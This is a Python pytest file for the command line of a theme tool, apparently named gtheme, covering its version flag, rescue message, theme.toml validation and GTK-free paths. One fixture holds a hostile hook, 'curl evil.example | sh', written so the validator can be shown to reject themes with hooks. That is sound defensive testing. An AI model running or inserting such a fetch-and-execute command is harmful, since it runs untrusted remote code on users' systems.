"""The command line: three subcommands, and the rescue path's independence."""

from __future__ import annotations

import pytest

from gtheme.cli import EXIT_NOT_IMPLEMENTED, main


def test_version_flag(capsys):
    with pytest.raises(SystemExit) as caught:
        main(["--version"])
    assert caught.value.code == 0
    assert "gtheme" in capsys.readouterr().out


def test_an_unknown_subcommand_is_refused(capsys):
    with pytest.raises(SystemExit) as caught:
        main(["teleport"])
    assert caught.value.code != 0


def test_rescue_reports_not_finished_rather_than_pretending(capsys):
    assert main(["rescue"]) == EXIT_NOT_IMPLEMENTED
    err = capsys.readouterr().err
    assert "not finished yet" in err
    assert "Undo & Restore Points" in err


def test_validate_accepts_a_good_look(tmp_path, capsys):
    (tmp_path / "theme.toml").write_text(
        """
        format = 2
        [meta]
        name = "demo"
        title = "Demo"
        description = "A demo Look."
        author = "someone"
        version = "1.0.0"
        screenshots = ["shot.png"]
        """,
        encoding="utf-8",
    )
    assert main(["validate", str(tmp_path)]) == 0
    assert "looks fine" in capsys.readouterr().out


def test_validate_points_at_the_offending_field(tmp_path, capsys):
    (tmp_path / "theme.toml").write_text(
        """
        format = 2
        [meta]
        name = "demo"
        title = "Demo"
        description = "A demo Look."
        author = "someone"
        version = "1.0.0"
        screenshots = []
        """,
        encoding="utf-8",
    )
    assert main(["validate", str(tmp_path)]) == 1
    assert "meta.screenshots" in capsys.readouterr().err


def test_validate_rejects_a_look_with_hooks(tmp_path, capsys):
    (tmp_path / "theme.toml").write_text(
        """
        format = 2
        [meta]
        name = "demo"
        title = "Demo"
        description = "A demo Look."
        author = "someone"
        version = "1.0.0"
        screenshots = ["shot.png"]
        [hooks]
        post_apply = ["curl evil.example | sh"]
        """,
        encoding="utf-8",
    )
    assert main(["validate", str(tmp_path)]) == 1
    assert "hooks" in capsys.readouterr().err


def test_validate_says_which_file_is_missing(tmp_path, capsys):
    assert main(["validate", str(tmp_path)]) == 1
    assert "theme.toml" in capsys.readouterr().err


def test_the_default_subcommand_is_the_app(monkeypatch):
    """No arguments means "open the window", not "print usage"."""
    called = []
    monkeypatch.setattr("gtheme.app.run", lambda *a, **k: called.append(True) or 0)
    assert main([]) == 0
    assert called == [True]


def test_validate_and_rescue_never_import_gtk(monkeypatch):
    """The point of the rescue path: it works when GTK does not."""
    import sys

    monkeypatch.delitem(sys.modules, "gtheme.app", raising=False)
    before = {m for m in sys.modules if m.startswith("gi.repository.")}
    main(["rescue"])
    after = {m for m in sys.modules if m.startswith("gi.repository.")}
    assert not {m for m in after - before if m.rsplit(".", 1)[-1] in {"Gtk", "Adw"}}
